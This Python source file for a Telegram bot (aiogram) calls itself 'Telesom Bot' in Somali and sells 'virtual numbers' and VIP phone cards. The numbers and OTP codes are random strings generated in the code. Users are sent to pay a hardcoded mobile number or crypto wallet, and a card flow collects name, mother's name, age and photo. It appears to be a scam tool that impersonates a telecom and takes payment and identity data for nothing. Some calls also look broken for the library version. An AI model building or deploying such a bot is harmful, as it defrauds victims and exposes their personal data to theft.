import os, random, asyncio
from aiogram import Bot, Dispatcher, F, types
from aiogram.types import *
from aiogram.filters import Command
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State

# ===== CONFIG =====
BOT_TOKEN = os.getenv("BOT_TOKEN")  # Your bot token
ADMIN_ID = 7983838654  # Admin ID

bot = Bot(BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ===== STORAGE =====
user_data = {}
pending_admin = {}

# ===== STATES =====
class UserState(StatesGroup):
    waiting_code_check = State()
    waiting_name = State()
    waiting_mother_name = State()
    waiting_age = State()
    waiting_photo = State()
    waiting_payment_screenshot = State()

# ===== HELPERS =====
def random_number(vip=False):
    if vip:
        return "063" + "".join(str(random.choice([4,5,6])) + str(random.randint(0,9)) for _ in range(3))
    return "063" + "".join(str(random.randint(0,9)) for _ in range(7))

def service_code(service):
    codes = {
        "whatsapp": lambda: "".join(random.choices("0123456789", k=6)),
        "tiktok": lambda: "TT" + "".join(random.choices("0123456789", k=5)),
        "telegram": lambda: "TG" + "".join(random.choices("0123456789", k=5)),
        "google": lambda: "G-" + "".join(random.choices("0123456789", k=8)),
        "card": lambda: "".join(random.choices("0123456789", k=6))
    }
    return codes.get(service, lambda: "".join(random.choices("0123456789", k=6)))()

async def animation(msg, text, sec=5):
    for i in range(sec):
        dots = "." * ((i % 3) + 1)
        await asyncio.sleep(1)
        await msg.edit_text(f"{text}{dots}")

# ===== START =====
@dp.message(Command("start"))
async def start(msg: types.Message):
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton("New Order"), KeyboardButton("Check Code")]],
        resize_keyboard=True
    )
    await msg.answer("Ku soo dhawoow Telesom Bot", reply_markup=kb)

# ===== NEW ORDER =====
@dp.message(lambda m: m.text=="New Order")
async def new_order(msg: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIRTUAL", callback_data="virtual")],
        [InlineKeyboardButton("CARD", callback_data="card")]
    ])
    await msg.answer("Dooro nooca order-ka:", reply_markup=kb)

# ===== CHECK CODE =====
@dp.message(lambda m: m.text=="Check Code")
async def check_code_start(msg: types.Message):
    await msg.answer("Fadlan gali code-kaaga:")
    await dp.current_state(user=msg.from_user.id).set_state(UserState.waiting_code_check)

@dp.message(UserState.waiting_code_check)
async def check_code_input(msg: types.Message, state: FSMContext):
    code = msg.text.strip()
    if user_data.get(msg.from_user.id,{}).get("code")==code:
        number = user_data[msg.from_user.id].get("number")
        await msg.answer(f"Code Confirmed ✅\nNumber: +252{number}")
    else:
        await msg.answer("Code invalid ❌")
    await state.clear()

# ===== VIRTUAL FLOW =====
@dp.callback_query(F.data=="virtual")
async def virtual(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("WHATSAPP", callback_data="whatsapp")],
        [InlineKeyboardButton("TIKTOK", callback_data="tiktok")],
        [InlineKeyboardButton("TELEGRAM", callback_data="telegram")],
        [InlineKeyboardButton("GOOGLE", callback_data="google")]
    ])
    await call.message.edit_text("Dooro Platform:", reply_markup=kb)

@dp.callback_query(F.data.in_(["whatsapp","tiktok","telegram","google"]))
async def virtual_platform(call: types.CallbackQuery):
    platform = call.data
    number = random_number()
    user_data[call.from_user.id] = {"platform":platform, "number":number}
    msg = await call.message.edit_text("Searching Number")
    await animation(msg,"Searching Number",5)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("LOCAL", callback_data="local")],
        [InlineKeyboardButton("CRYPTO", callback_data="crypto")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await msg.edit_text(
        f"Number: +252{number}\nDir Lacagta si aad u hesho OTP", reply_markup=kb
    )

# ===== LOCAL / CRYPTO =====
@dp.callback_query(F.data=="local")
async def local_payment(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("+252907868526", callback_data="copy_local")],
        [InlineKeyboardButton("CONFIRM", callback_data="confirm_local")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text("Payment Local", reply_markup=kb)

@dp.callback_query(F.data=="crypto")
async def crypto_payment(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("BNB:0x98ffcb29a4fc182d461ebdba54648d8fe24597ac", callback_data="copy_bnb")],
        [InlineKeyboardButton("USDT-BEP20:0x98ffcb29a4fc182d461ebdba54648d8fe24597ac", callback_data="copy_usdt")],
        [InlineKeyboardButton("CANCEL", callback_data="cancel")]
    ])
    await call.message.edit_text("Dooro Crypto Address", reply_markup=kb)

@dp.callback_query(F.data.in_(["copy_bnb","copy_usdt","copy_local"]))
async def copy_address(call: types.CallbackQuery):
    addr_map = {
        "copy_bnb":"0x98ffcb29a4fc182d461ebdba54648d8fe24597ac",
        "copy_usdt":"0x98ffcb29a4fc182d461ebdba54648d8fe24597ac",
        "copy_local":"+252907868526"
    }
    await call.answer(f"Copied: {addr_map[call.data]}", show_alert=True)

@dp.callback_query(F.data=="confirm_local")
async def confirm_local(call: types.CallbackQuery):
    user_id = call.from_user.id
    await call.message.edit_text("Payment confirmed, admin-ga wargelinaya...")
    code = service_code("whatsapp")
    user_data[user_id]["code"] = code
    pending_admin[user_id] = True
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("APPROVE", callback_data=f"admin_ok_{user_id}")],
        [InlineKeyboardButton("REJECT", callback_data=f"admin_reject_{user_id}")]
    ])
    info = user_data[user_id]
    await bot.send_message(ADMIN_ID,
        f"Virtual Request\nUser: {user_id}\nPlatform: {info['platform']}\nNumber: {info['number']}\nCode: {code}",
        reply_markup=kb
    )
    await asyncio.sleep(5)
    await call.message.answer("....\n..\n.")

# ===== CARD FLOW =====
@dp.callback_query(F.data=="card")
async def card_type(call: types.CallbackQuery):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("VIP", callback_data="vip")],
        [InlineKeyboardButton("NORMAL", callback_data="normal")]
    ])
    await call.message.edit_text("Dooro Card Type:", reply_markup=kb)

@dp.callback_query(F.data.in_(["vip","normal"]))
async def card_order(call: types.CallbackQuery):
    user_id = call.from_user.id
    card_type = call.data
    user_data[user_id] = {"card_type":card_type, "number":random_number(vip=(card_type=="vip"))}
    await call.message.answer("Fadlan gali Magacaaga:")
    await dp.current_state(user=user_id).set_state(UserState.waiting_name)

# ===== RUN BOT =====
async def main():
    await dp.start_polling(bot)

if __name__=="__main__":
    import logging
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())
